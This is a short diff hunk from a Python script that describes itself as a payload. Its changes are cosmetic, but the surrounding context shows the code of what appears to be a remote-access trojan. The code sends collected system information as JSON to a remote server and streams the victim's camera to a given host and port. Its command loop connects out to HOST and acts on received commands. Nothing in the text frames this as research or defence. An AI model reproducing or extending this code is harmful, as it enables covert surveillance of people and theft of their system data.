@@ -71,6 +71,7 @@ def GettingInfoOfTheSystem(__server__): #it worke
 
     WHAT_TO_SEND = json.dumps(ALL_INFO)
     __server__.send(WHAT_TO_SEND.encode())
+
 #the CameraStreaming function
 def StartCameraStreaming(host, port):
     global CAMERA_STREAMING    
@@ -81,7 +82,8 @@ def StartCameraStreaming(host, port):
     CAMERA_STREAMING_THREAD.start()
 def StopCameraStreaming() :
     CAMERA_STREAMING.stop_stream()
-
+    
+#the run function for the payload
 def SocketThing(host, port, camera_streaming_port):
     STATIC = False
     SERVER_TO_CONNECT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -105,8 +107,6 @@ def SocketThing(host, port, camera_streaming_port):
         elif JSON_READ_MSG["command"] == "stop connection":
             SERVER_TO_CONNECT.close()
             sys.exit()
-
-
 
 SocketThing(
     host =  HOST,
